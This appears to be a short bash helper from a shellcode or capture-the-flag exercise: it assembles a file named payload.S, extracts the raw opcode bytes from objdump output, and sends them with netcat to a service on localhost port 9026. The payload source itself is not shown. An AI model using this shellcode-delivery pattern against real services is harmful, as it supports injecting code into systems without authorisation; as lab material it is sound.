#!/bin/bash

as payload.S -o payload.o
ld payload.o -o payload
rm payload.o
for i in $(objdump -D payload | tr '\t' ' ' | tr ' ' '\n' | egrep "^[0-9a-f]{2}$"); do echo -en "\x$i"; done > input
rm payload
nc 0 9026 < ./input
rm input